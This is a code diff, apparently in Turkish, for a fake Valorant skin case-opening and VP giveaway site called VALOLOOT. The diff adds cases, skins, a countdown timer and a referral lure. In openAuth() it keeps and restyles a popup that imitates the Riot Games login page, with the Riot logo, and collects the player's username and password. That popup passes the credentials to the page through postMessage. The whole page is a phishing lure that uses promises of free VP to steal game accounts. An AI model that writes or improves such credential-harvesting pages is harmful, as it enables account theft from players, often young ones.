@@ -18,6 +18,7 @@
         .rarity-box { width: 100%; height: 6px; margin-top: auto; }
         @keyframes slideInLeft { from { transform: translateX(-100%); opacity: 0; margin-left: -130px; } to { transform: translateX(0); opacity: 1; margin-left: 0; } }
 
+        /* HEADER */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
         .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
         .logo span { color: var(--valo-red); }
@@ -25,9 +26,11 @@
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
         .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
 
+        /* ÇEKİLİŞ ALANI */
         .giveaway-section { max-width: 1100px; margin: 30px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 25px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
 
+        /* KASA GRID */
         .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 50px; }
         .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
         .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; cursor: pointer; }
@@ -37,13 +40,13 @@
         .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
         .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
 
+        /* MODAL */
         .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:9999; align-items:center; justify-content:center; }
         .modal-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:550px; padding:40px; text-align:center; }
         .spinner-box { width:100%; height:140px; background:#0b1119; border:1px solid rgba(255,255,255,0.1); margin:25px 0; overflow:hidden; position:relative; display:flex; align-items:center; border-radius: 8px; }
         .spinner-line { position:absolute; left:50%; width:4px; height:100%; background:var(--valo-red); z-index:10; transform: translateX(-50%); box-shadow: 0 0 20px var(--valo-red); }
         .item-strip { display:flex; position:absolute; left:0; transition: transform 5s cubic-bezier(0.1, 0, 0, 1); align-items:center; }
         .item-strip img { width:130px; height: 100px; object-fit: contain; margin:0 20px; }
-        
         .win-view { display:none; animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes zoomIn { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
         .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; }
@@ -58,7 +61,10 @@
 
     <header>
         <div class="logo">VALO<span>LOOT</span></div>
-        <div id="authArea" style="margin-left: auto;">
+        <div class="nav-links">
+            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Mağaza</a>
+        </div>
+        <div id="authArea">
             <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
         </div>
     </header>
@@ -68,27 +74,30 @@
             <h2 style="margin:0; font-family:'Montserrat'; font-size:28px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
             <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
         </div>
-        <div id="countdown" style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">00:00:00</div>
+        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
+            <div id="countdown">00:00:00</div>
+            <span style="font-size:10px; color:#555;">GÜNLÜK YENİLENİR</span>
+        </div>
     </div>
 
     <div class="case-wrapper">
         <div class="case-row" id="row1"></div>
-        <div class="case-row" id="row2"></div>
+        <div class="case-row" id="row2" style="margin-top:20px;"></div>
     </div>
 
     <div id="caseModal" class="modal-overlay">
         <div class="modal-card">
             <div id="openingView">
-                <h2 style="font-family:'Montserrat';">KASA AÇILIYOR...</h2>
+                <h2 style="font-family:'Montserrat'; letter-spacing: 2px; color:var(--valo-red);">KASA AÇILIYOR...</h2>
                 <div class="spinner-box"><div class="spinner-line"></div><div id="itemStrip" class="item-strip"></div></div>
             </div>
             <div id="winView" class="win-view">
                 <h1 style="color:#79eb1e;">TEBRİKLER!</h1>
-                <img id="wonImg" src="" style="width:200px; margin:20px 0;">
+                <img id="wonImg" src="" style="width:220px; margin:15px 0;">
                 <h2 id="wonName">-</h2>
-                <div id="wonVP" style="background:#79eb1e; color:#000; padding:10px; font-weight:900; margin-top:10px;">0 VP</div>
-                <div class="ref-box">VALOLOOT.NET/JOIN?REF=<span id="refCode">...</span></div>
-                <button class="open-btn" onclick="alert('Lütfen bekleyin...')">HESABA AKTAR</button>
+                <div id="wonVP" style="background:#79eb1e; color:#000; padding:12px; border-radius:6px; font-weight:900; margin-top:15px;">0 VP</div>
+                <div class="ref-box" onclick="alert('Kopyalandı!')">VALOLOOT.NET/JOIN?REF=<span id="refCode">...</span></div>
+                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Önce arkadaş davetini tamamla!')">HESABA AKTAR (VP)</button>
             </div>
         </div>
     </div>
@@ -98,7 +107,9 @@
         const skins = [
             {n: "YAĞMACI VANDAL", img: "skin1.png", vp: "1775 VP", color: "#ade55c"},
             {n: "ASİL PHANTOM", img: "skin2.png", vp: "1775 VP", color: "#4b82d5"},
-            {n: "EJDER ATEŞİ OPERATOR", img: "skin3.png", vp: "2475 VP", color: "#d151dc"}
+            {n: "EJDER ATEŞİ OPERATOR", img: "skin3.png", vp: "2475 VP", color: "#d151dc"},
+            {n: "İON SHERIFF", img: "skin4.png", vp: "1775 VP", color: "#f7c133"},
+            {n: "KAOS VANDAL", img: "skin5.png", vp: "2175 VP", color: "#ff4655"}
         ];
 
         function spawnDrop() {
@@ -107,9 +118,9 @@
             const div = document.createElement('div');
             div.className = 'drop-card';
             div.innerHTML = `<img src="${s.img}"><div class="rarity-box" style="background:${s.color}"></div>`;
-            track.prepend(div);
+            track.prepend(div); 
             if(track.children.length > 10) track.removeChild(track.lastChild);
-            setTimeout(spawnDrop, 3000);
+            setTimeout(spawnDrop, 2000);
         }
 
         function loadCases() {
@@ -117,13 +128,18 @@
                 {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true},
                 {n: "STANDART", p: "30 VP", i: "case2.png"},
                 {n: "ELİT", p: "50 VP", i: "case3.png"},
+                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
                 {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
             ];
             const r1 = document.getElementById('row1');
-            r1.innerHTML = '';
-            cases.forEach(c => {
-                const action = c.free ? "openFreeCase()" : "openAuth()";
-                r1.innerHTML += `<div class="case-box" onclick="${action}"><div class="case-img-container"><img src="${c.i}"></div><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
+            const r2 = document.getElementById('row2');
+            r1.innerHTML = ''; r2.innerHTML = '';
+            cases.slice(0, 4).forEach(c => {
+                r1.innerHTML += `<div class="case-box" onclick="${c.free?'openFreeCase()':'openAuth()'}"><div class="case-img-container"><img src="${c.i}"></div><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
+            });
+            cases.slice(4, 6).forEach(c => {
+                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}"></div><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`;
             });
         }
 
@@ -133,7 +149,7 @@
             const strip = document.getElementById('itemStrip');
             strip.innerHTML = '';
             const winner = skins[Math.floor(Math.random() * skins.length)];
-            for(let i=0; i<60; i++) strip.innerHTML += `<img src="${skins[i%3].img}">`;
+            for(let i=0; i<60; i++) strip.innerHTML += `<img src="${skins[i%5].img}">`;
             setTimeout(() => {
                 strip.style.transform = 'translateX(-7000px)';
                 setTimeout(() => {
@@ -146,61 +162,36 @@
             }, 100);
         }
 
-        // --- GİRİŞ EKRANI FONKSİYONU ---
         function openAuth() {
             const w = 450, h = 800;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
             let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
             win.document.write(`
                 <html><head><style>
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-                body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-                .card { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
-                .riot-logo { width: 50px; filter: brightness(0) invert(1); margin-bottom: 20px; }
-                h2 { font-weight: 900; margin-bottom: 30px; font-size: 24px; }
+                body { background: #0b1119; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                .card { width: 330px; text-align: center; background: #111420; padding: 40px; border-radius: 8px; border: 1px solid #222; }
+                h2 { font-weight: 900; margin-bottom: 25px; }
                 .input-group { position: relative; margin-bottom: 15px; }
-                input { width: 100%; padding: 20px 15px 10px 15px; background: #111420; border: 2px solid #222; border-radius: 4px; color: white; font-weight: bold; outline: none; transition: 0.2s; box-sizing: border-box; }
-                input:focus { border-color: #ff4655; background: #0b1119; }
-                label { position: absolute; left: 15px; top: 18px; color: #555; font-weight: 800; font-size: 11px; text-transform: uppercase; transition: 0.2s; pointer-events: none; }
+                input { width: 100%; padding: 20px 15px 10px 15px; background: #0b1119; border: 2px solid #333; border-radius: 4px; color: white; outline: none; box-sizing: border-box; }
+                input:focus { border-color: #ff4655; }
+                label { position: absolute; left: 15px; top: 18px; color: #555; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.2s; }
                 input:focus + label, input:not(:placeholder-shown) + label { top: 6px; font-size: 9px; color: #ff4655; }
-                
-                .social-grid { display: flex; gap: 10px; margin-bottom: 25px; justify-content: center; }
-                .s-btn { width: 100px; height: 45px; border-radius: 4px; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
-                .fb { background: #1877f2; } .gg { background: #fff; } .ap { background: #000; }
-                .s-btn img { width: 20px; } .s-btn:hover { opacity: 0.8; }
-                
-                .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
-                .footer-links { font-size: 11px; color: #555; margin-top: 30px; font-weight: 700; text-transform: uppercase; }
+                .s-btn { width: 100%; height: 45px; border-radius: 4px; margin-bottom: 10px; border: none; cursor: pointer; font-weight: 900; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; font-size: 11px; }
+                .fb { background: #1877f2; color: white; } .gg { background: #fff; color: #000; } .ap { background: #000; color: white; }
+                .login-btn { width: 100%; padding: 20px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: 900; cursor: pointer; margin-top: 15px; }
                 </style></head><body>
                 <div class="card">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" class="riot-logo">
-                    <h2>Oturum Aç</h2>
-                    
-                    <div class="social-grid">
-                        <button class="s-btn fb"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png"></button>
-                        <button class="s-btn gg"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"></button>
-                        <button class="s-btn ap"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter:invert(1)"></button>
-                    </div>
-
-                    <div class="input-group"><input id="u" placeholder=" "><label>Kullanıcı Adı</label></div>
-                    <div class="input-group"><input id="p" type="password" placeholder=" "><label>Şifre</label></div>
-                    
-                    <button class="login-btn" onclick="send()">Giriş Yap</button>
-                    
-                    <div class="footer-links">
-                        <div style="color:#aaa; cursor:pointer">Hesabın yok mu? Ücretsiz Oluştur</div>
-                        <div style="margin-top:10px; color:#555">Oturum açmakta sorun mu yaşıyorsun?</div>
-                    </div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50" style="filter: brightness(0) invert(1); margin-bottom: 15px;">
+                    <h2>OTURUM AÇ</h2>
+                    <button class="s-btn fb">FACEBOOK İLE GİRİŞ</button>
+                    <button class="s-btn gg">GOOGLE İLE GİRİŞ</button>
+                    <button class="s-btn ap">APPLE İLE GİRİŞ</button>
+                    <div style="margin: 20px 0; color: #333;">Veya</div>
+                    <div class="input-group"><input id="u" placeholder=" "><label>KULLANICI ADI</label></div>
+                    <div class="input-group"><input id="p" type="password" placeholder=" "><label>ŞİFRE</label></div>
+                    <button class="login-btn" onclick="send()">GİRİŞ YAP</button>
                 </div>
-                <script>
-                function send(){
-                    const u = document.getElementById('u').value, p = document.getElementById('p').value;
-                    if(u && p){
-                        window.opener.postMessage({u, p}, "*");
-                        window.close();
-                    }
-                }
-                <\\/script>
+                <script>function send(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u && p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\\/script>
                 </body></html>
             `);
         }
@@ -208,7 +199,7 @@
         window.addEventListener("message", (e) => {
             if(e.data.u) {
                 IS_LOGGED = true;
-                document.getElementById('authArea').innerHTML = `<div style="border:1px solid #79eb1e; color:#79eb1e; padding:10px; font-weight:900; border-radius:4px;">${e.data.u.toUpperCase()}#TR1</div>`;
+                document.getElementById('authArea').innerHTML = `<div style="border:1px solid #79eb1e; color:#79eb1e; padding:10px; font-weight:900;">${e.data.u.toUpperCase()}#TR1</div>`;
                 document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
                 document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
                 loadCases();
@@ -219,6 +210,13 @@
             }
         });
 
+        function tick() {
+            const now = new Date(); let target = new Date(); target.setHours(24, 0, 0, 0);
+            let diff = target - now; if(diff < 0) diff += 86400000;
+            let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
+            document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        }
+        setInterval(tick, 1000); tick();
         window.onload = () => { spawnDrop(); loadCases(); };
     </script>
 </body>
